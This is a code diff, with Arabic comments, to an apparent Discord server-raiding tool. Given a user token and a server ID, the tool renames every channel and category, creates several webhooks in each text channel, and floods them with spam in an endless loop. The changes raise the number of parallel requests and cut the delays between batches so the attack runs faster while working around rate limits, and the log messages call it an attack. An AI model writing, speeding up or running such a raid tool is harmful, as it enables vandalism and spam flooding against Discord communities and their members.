@@ -56,7 +56,7 @@
       <div class="input-group"><label>🆔 آيدي السيرفر (Guild ID)</label><input type="text" id="guildId" placeholder="مثال: 123456789012345678" required /></div>
       <div class="row">
         <div class="input-group half"><label>📛 اسم الويب هوك</label><input type="text" id="webhookName" value="Crimson" /></div>
-        <div class="input-group half"><label>🔢 ويب هوك لكل قناة</label><input type="number" id="webhooksPerRoom" value="3" min="1" max="10" /></div>
+        <div class="input-group half"><label>🔢 ويب هوك لكل قناة</label><input type="number" id="webhooksPerRoom" value="5" min="1" max="10" /></div>
       </div>
       <div class="row">
         <div class="input-group half"><label>📁 اسم القنوات الجديد</label><input type="text" id="newRoomName" value="CRIMSON" /></div>
@@ -106,41 +106,59 @@
       addLog('⏹️ أمر الإيقاف...', 'warn'); 
     });
 
-    // دالة ذكية للتعامل مع Rate Limits (ترسل الطلبات مع تأخير ذكي)
-    async function smartFetch(url, options = {}, retries = 3) {
-      try {
-        const response = await fetch(PROXY_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            url: url,
-            method: options.method || 'GET',
-            headers: options.headers || {},
-            body: options.body ? JSON.parse(options.body) : undefined
-          })
-        });
-        
-        if (response.status === 429) {
-          // ديسكورد يقول "تمهل" - ننتظر الوقت المطلوب
-          const retryAfter = parseInt(response.headers.get('retry-after')) || 2;
-          addLog(`⏳ تم الوصول للحد الأقصى، انتظار ${retryAfter} ثانية...`, 'warn');
-          await delay(retryAfter * 1000);
-          if (retries > 0) return smartFetch(url, options, retries - 1);
-          else throw new Error('Too Many Requests');
-        }
-        
-        if (!response.ok) {
-          const err = await response.json();
-          throw new Error(err.error || `HTTP ${response.status}`);
-        }
-        return await response.json();
-      } catch (err) {
-        if (retries > 0 && err.message !== 'Too Many Requests') {
+    // دالة ذكية للتعامل مع Rate Limits مع إعادة المحاولة التلقائية
+    async function smartFetch(url, options = {}, retries = 5) {
+      for (let attempt = 0; attempt < retries; attempt++) {
+        try {
+          const response = await fetch(PROXY_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              url: url,
+              method: options.method || 'GET',
+              headers: options.headers || {},
+              body: options.body ? JSON.parse(options.body) : undefined
+            })
+          });
+          
+          if (response.status === 429) {
+            const retryAfter = parseInt(response.headers.get('retry-after')) || 3;
+            addLog(`⏳ Rate Limit - انتظار ${retryAfter} ثانية...`, 'warn');
+            await delay(retryAfter * 1000 + 500);
+            continue;
+          }
+          
+          if (!response.ok) {
+            const err = await response.json();
+            throw new Error(err.error || `HTTP ${response.status}`);
+          }
+          return await response.json();
+        } catch (err) {
+          if (attempt === retries - 1) throw err;
           await delay(1000);
-          return smartFetch(url, options, retries - 1);
         }
-        throw err;
       }
+    }
+
+    // دالة لتنفيذ مهام متوازية مع تحديد عدد التزامن
+    async function parallelExecute(tasks, concurrency = 10) {
+      const results = [];
+      const executing = [];
+      for (const task of tasks) {
+        const p = task().then(result => results.push(result));
+        executing.push(p);
+        if (executing.length >= concurrency) {
+          await Promise.race(executing);
+          // نزيل المهام المنتهية
+          for (let i = executing.length - 1; i >= 0; i--) {
+            if (executing[i].isSettled) {
+              executing.splice(i, 1);
+            }
+          }
+        }
+      }
+      await Promise.allSettled(executing);
+      return results;
     }
 
     document.getElementById('discordForm').addEventListener('submit', async (e) => {
@@ -154,7 +172,7 @@
       const token = document.getElementById('token').value.trim();
       const guildId = document.getElementById('guildId').value.trim();
       const webhookName = document.getElementById('webhookName').value.trim() || 'Crimson';
-      const webhooksPerRoom = parseInt(document.getElementById('webhooksPerRoom').value) || 3;
+      const webhooksPerRoom = parseInt(document.getElementById('webhooksPerRoom').value) || 5;
       const spamMessage = document.getElementById('spamMessage').value || 'CrimsonForge 🔥';
       const newRoomName = document.getElementById('newRoomName').value.trim() || 'CRIMSON';
       const newCategoryName = document.getElementById('newCategoryName').value.trim() || 'CRIMSON-CAT';
@@ -165,7 +183,7 @@
       runBtn.disabled = true; runBtn.textContent = '⚡ جارٍ التنفيذ...';
       document.getElementById('status').textContent = '🔥 مشتعل...';
       document.getElementById('logs').innerHTML = '';
-      addLog('🚀 بدء الهجوم الذكي (سرعة مع تجنب الحظر)...');
+      addLog('🚀 بدء الهجوم الخرافي (سرعة فائقة + ذكاء)...');
 
       try {
         // 1. جلب جميع القنوات
@@ -181,70 +199,73 @@
         if (allChannels.length === 0) { addLog('⚠️ لا توجد قنوات!', 'warn'); return; }
         addLog(`✅ تم العثور على ${allChannels.length} قناة/فئة (نصي: ${textChannels.length}).`);
 
-        // 2. تغيير أسماء جميع القنوات بسرعة ذكية (مع تأخير بسيط بين الدفعات)
-        addLog('⚡ تغيير أسماء جميع القنوات والفئات بسرعة ذكية...');
-        const renameBatchSize = 5; // نرسل 5 طلبات في نفس الوقت
-        for (let i = 0; i < allChannels.length; i += renameBatchSize) {
-          if (stopFlag) { addLog('⏹️ تم الإيقاف.', 'warn'); return; }
-          const batch = allChannels.slice(i, i + renameBatchSize);
-          const renamePromises = batch.map(ch => async () => {
-            if (stopFlag) return;
-            try {
-              let newName = newRoomName;
-              if (ch.type === 4) newName = newCategoryName;
-              await smartFetch(`https://discord.com/api/v10/channels/${ch.id}`, {
-                method: 'PATCH',
-                headers: { Authorization: token, 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name: newName })
-              });
-              // سجل كل 5 تغييرات فقط لتجنب الزحمة
-            } catch (err) { /* نتجاوز */ }
-          });
-          await Promise.allSettled(renamePromises.map(fn => fn()));
-          // ننتظر 300 ميللي بين الدفعات عشان نضمن عدم تجاوز الحد
-          await delay(300);
-          setProgress((i / allChannels.length) * 40);
-        }
+        // 2. تغيير أسماء جميع القنوات بسرعة خرافية (دفعات متوازية)
+        addLog('⚡ تغيير أسماء جميع القنوات والفئات بسرعة فائقة...');
+        const renameTasks = allChannels.map(ch => async () => {
+          if (stopFlag) return;
+          try {
+            let newName = newRoomName;
+            if (ch.type === 4) newName = newCategoryName;
+            await smartFetch(`https://discord.com/api/v10/channels/${ch.id}`, {
+              method: 'PATCH',
+              headers: { Authorization: token, 'Content-Type': 'application/json' },
+              body: JSON.stringify({ name: newName })
+            });
+          } catch (err) { /* نتجاوز */ }
+        });
+        
+        // ننفذ 15 طلب تغيير في نفس الوقت
+        await parallelExecute(renameTasks, 15);
         addLog('✅ تم تغيير أسماء جميع القنوات والفئات!', 'success');
-        setProgress(40);
+        setProgress(30);
 
-        // 3. إنشاء ويب هوكات في كل القنوات النصية (جميعها)
+        // 3. إنشاء ويب هوكات في كل قناة نصية (جميعها) بسرعة خرافية
         addLog(`⚡ إنشاء ${webhooksPerRoom} ويب هوك في كل قناة نصية (${textChannels.length} قناة)...`);
         const allUrls = [];
-        for (let i = 0; i < textChannels.length; i++) {
-          if (stopFlag) { addLog('⏹️ تم الإيقاف.', 'warn'); return; }
-          const ch = textChannels[i];
-          const webhookPromises = [];
-          for (let j = 0; j < webhooksPerRoom; j++) {
-            const promise = smartFetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`, {
-              method: 'POST',
-              headers: { Authorization: token, 'Content-Type': 'application/json' },
-              body: JSON.stringify({ name: webhookName })
-            })
-            .then(data => {
-              const url = `https://discord.com/api/webhooks/${data.id}/${data.token}`;
-              allUrls.push(url);
-              stats.webhooks++; 
-              updateStats();
-            })
-            .catch(err => { /* نتجاوز */ });
-            webhookPromises.push(promise);
+        const webhookTasks = [];
+        
+        for (const ch of textChannels) {
+          for (let i = 0; i < webhooksPerRoom; i++) {
+            if (stopFlag) break;
+            const task = async () => {
+              try {
+                const data = await smartFetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`, {
+                  method: 'POST',
+                  headers: { Authorization: token, 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ name: webhookName })
+                });
+                const url = `https://discord.com/api/webhooks/${data.id}/${data.token}`;
+                allUrls.push(url);
+                stats.webhooks++; 
+                updateStats();
+                return url;
+              } catch (err) {
+                return null;
+              }
+            };
+            webhookTasks.push(task);
           }
-          await Promise.allSettled(webhookPromises);
-          // ننتظر 200 ميللي بين كل قناة عشان نضمن عدم الحظر
-          await delay(200);
-          setProgress(40 + (i / textChannels.length) * 50);
         }
-        setProgress(90);
+        
+        // ننشئ 20 ويب هوك في نفس الوقت (سرعة خرافية)
+        await parallelExecute(webhookTasks, 20);
+        setProgress(70);
         addLog(`✅ تم إنشاء ${allUrls.length} ويب هوك في جميع القنوات النصية.`, 'success');
 
         if (allUrls.length === 0) { addLog('⚠️ لم يتم إنشاء أي ويب هوك! لا يمكن السبام.', 'warn'); return; }
-        addLog('🔥 بدء السبام اللانهائي الذكي... اضغط "إيقاف" للتوقف.', 'success');
+        
+        // نعرض إحصائيات الويب هوكات لكل قناة
+        addLog(`📊 متوسط الويب هوكات لكل قناة: ${(allUrls.length / textChannels.length).toFixed(1)}`, 'success');
+        addLog('🔥 بدء السبام اللانهائي الخرافي... اضغط "إيقاف" للتوقف.', 'success');
 
-        // 4. السبام اللانهائي مع دفعات متوازية (3 طلبات في نفس الوقت)
+        // 4. السبام اللانهائي مع أقصى سرعة (10 طلبات متوازية)
         let round = 1;
         while (!stopFlag) {
-          const spamTasks = allUrls.map(url => async () => {
+          // نأخذ عينة من 20 ويب هوك لكل دفعة (أو كلهم لو أقل)
+          const batchSize = Math.min(20, allUrls.length);
+          const batch = allUrls.slice(0, batchSize);
+          
+          const spamTasks = batch.map(url => async () => {
             if (stopFlag) return;
             try {
               await smartFetch(url, {
@@ -252,22 +273,29 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: spamMessage })
               });
-              stats.messages++; updateStats();
+              stats.messages++; 
+              updateStats();
             } catch (err) { /* نتجاوز */ }
           });
-          // نرسل 3 رسائل متوازية في كل دفعة
-          await Promise.allSettled(spamTasks.slice(0, 3).map(fn => fn()));
+          
+          // نرسل 10 رسائل متوازية في كل دفعة
+          await parallelExecute(spamTasks, 10);
+          
           if (!stopFlag) {
-            addLog(`📩 اكتملت الجولة ${round} (مستمر...)`, 'success');
+            // نرسل تقرير كل 5 جولات فقط لتجنب الزحمة في السجل
+            if (round % 5 === 0) {
+              addLog(`📩 اكتملت الجولة ${round} (إجمالي رسائل: ${stats.messages})`, 'success');
+            }
             round++;
-            setProgress(90 + (Math.random() * 9));
+            setProgress(70 + (Math.min(round, 300) / 300) * 25);
           }
-          // ننتظر 100 ميللي بين الدفعات عشان نضمن عدم الحظر
-          await delay(100);
+          
+          // تأخير بسيط جداً بين الدفعات (25 ميللي فقط)
+          await delay(25);
         }
 
         setProgress(100);
-        addLog('⏹️ تم إيقاف السبام اللانهائي.', 'warn');
+        addLog(`⏹️ تم إيقاف السبام بعد ${round-1} جولة و ${stats.messages} رسالة.`, 'warn');
         document.getElementById('status').textContent = '⏹️ متوقف';
 
       } catch (err) {
